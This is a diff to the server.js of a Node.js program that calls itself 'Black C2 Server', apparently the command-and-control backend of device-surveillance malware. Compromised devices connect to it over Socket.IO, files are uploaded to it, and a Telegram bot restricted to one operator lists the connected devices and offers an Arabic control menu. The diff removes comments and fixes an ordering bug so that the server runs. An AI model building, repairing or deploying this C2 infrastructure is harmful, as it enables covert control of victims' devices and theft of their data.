@@ -1,5 +1,3 @@
-// language: JavaScript (Node.js), file: server.js, runtime: Node.js 16+
-
 const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
@@ -13,31 +11,26 @@ const app = express();
 const server = http.createServer(app);
 const io = new Server(server, { cors: { origin: '*' } });
 
-// نستخدم bot بدون polling
 const bot = new TelegramBot(config.token);
 
-// --- Multer setup ---
+// تعريف devices قبل استخدامها
+const devices = new Map();
+
 const uploader = multer({ dest: 'uploads/' });
 if (!fs.existsSync('uploads')) fs.mkdirSync('uploads');
 
-// --- Middleware ---
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// --- Helper: Escape HTML ---
 function escapeHtml(str) {
     return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
 }
 
-// --- Helper: Get active device ---
 function getDeviceSocket(deviceId) {
     if (deviceId) return devices.get(deviceId);
     return devices.values().next().value;
 }
 
-const devices = new Map();
-
-// --- Routes ---
 app.get('/', (req, res) => res.send('Black C2 Server is running.'));
 
 app.post('/upload', uploader.single('file'), (req, res) => {
@@ -50,7 +43,6 @@ app.post('/upload', uploader.single('file'), (req, res) => {
     res.send('Done');
 });
 
-// --- Socket.IO ---
 io.on('connection', (socket) => {
     const deviceId = socket.handshake.query.id || `device-${Date.now()}`;
     socket.deviceId = deviceId;
@@ -81,7 +73,6 @@ io.on('connection', (socket) => {
     });
 });
 
-// --- Telegram Bot: Webhook ---
 const webhookPath = `/bot${config.token}`;
 app.use(bot.webhookCallback(webhookPath));
 
@@ -92,7 +83,6 @@ bot.setWebHook(webhookUrl).then(() => {
     console.error(`Webhook error: ${err.message}`);
 });
 
-// --- Main Menu ---
 function showMainMenu(chatId) {
     const keyboard = [
         [{ text: '📱 معلومات الجهاز', callback_data: 'info' }],
@@ -116,7 +106,6 @@ function showMainMenu(chatId) {
     bot.sendMessage(chatId, '✯ لوحة التحكم:', { reply_markup: { inline_keyboard: keyboard } });
 }
 
-// --- Bot Commands ---
 bot.onText(/\/start/, (msg) => {
     if (msg.chat.id !== config.id) return;
     bot.sendMessage(msg.chat.id, `✯ أهلاً بك في بوت Black C2\nتم تطويره بواسطة: المطورة رزان (@a_yrj)\n\n📊 الأجهزة المتصلة: ${devices.size}`, { parse_mode: 'HTML' });
@@ -137,7 +126,6 @@ bot.onText(/\/devices/, (msg) => {
     bot.sendMessage(msg.chat.id, text, { parse_mode: 'HTML' });
 });
 
-// --- Callback Handler ---
 bot.on('callback_query', (query) => {
     const chatId = query.message.chat.id;
     if (chatId !== config.id) return bot.answerCallbackQuery(query.id);
@@ -192,6 +180,5 @@ bot.on('callback_query', (query) => {
     }
 });
 
-// --- Start Server ---
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => console.log(`Black C2 server is running on port ${PORT}`));
